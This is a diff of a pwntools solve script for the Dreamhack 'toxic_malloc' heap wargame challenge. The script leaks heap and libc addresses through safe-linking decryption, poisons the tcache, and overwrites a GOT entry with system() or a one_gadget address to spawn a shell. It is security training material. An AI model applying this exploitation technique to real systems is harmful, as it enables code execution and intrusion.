@@ -1,9 +1,10 @@
 from pwn import *
 
-# context.log_level = 'debug'
-context.terminal = ['tmux', 'new-window']
+context.log_level = 'debug'
+# context.terminal = ['tmux', 'new-window']
 
-rem = process("./Pwnable/toxic_malloc/problem/deploy/chall")
+env = {"LD_PRELOAD": "/home/hibrian827/Wargame/Dreamhack/Pwnable/toxic_malloc/problem/deploy/libc.so.6"}
+rem = process("./Pwnable/toxic_malloc/problem/deploy/chall", env=env)
 # port = 18595
 # rem = remote("host3.dreamhack.games", port)
 
@@ -49,30 +50,31 @@ def delete(idx):
   rem.sendlineafter(b'choice:', b"4")
   rem.sendlineafter(b": ", str(idx).encode())
 
+create(0, b'A' * 8)
 create(1, b'A' * 8)
-create(4, b'A' * 8)
 
-delete(1)
-update(1, p64(0) * 2)
-delete(1)
-heap_base = decrypt_safe_linking(u64(read(1).rstrip().ljust(8, b'\x00'))) - 0x2a0
+delete(0)
+update(0, p64(0) * 2)
+delete(0)
+heap_base = decrypt_safe_linking(u64(read(0).rstrip().ljust(8, b'\x00'))) - 0x2a0
 print(hex(heap_base))
 
 for i in range(1, 7):
-  update(1, p64(0) * 2)
-  delete(1)
+  update(0, p64(0) * 2)
+  delete(0)
 
-lib_base = u64(read(1).rstrip().ljust(8, b'\x00')) - 0x21ace0
-strlen_got = lib_base + lib.got['strlen'] - 8
-sys_addr = lib_base + lib.symbols['system']
-print(hex(strlen_got))
+lib_base = u64(read(0).rstrip().ljust(8, b'\x00')) - 0x21ace0
+stdout_got = lib_base + lib.got['realloc']
+if stdout_got % 0x10 != 0:
+  stdout_got -= 8
+gadget_addr = lib_base + 0xebd43
+print(hex(stdout_got))
 
-update(1, p64(safe_link(heap_base+0x2a0, heap_base+0x2a0)))
-create(0, p64(safe_link(heap_base+0x2a0, strlen_got)))
-create(2, b"A" * 16)
-create(3, p64(sys_addr)*2)
-update(2, b"/bin/sh\x00")
-read(2)
-
+update(0, p64(safe_link(heap_base+0x2a0, heap_base+0x2a0)))
+create(2, p64(safe_link(heap_base+0x2a0, stdout_got)))
+create(3, b"A" * 16)
+create(4, p64(gadget_addr) * 2)
 gdb.attach(rem)
+read(3)
+
 rem.interactive()
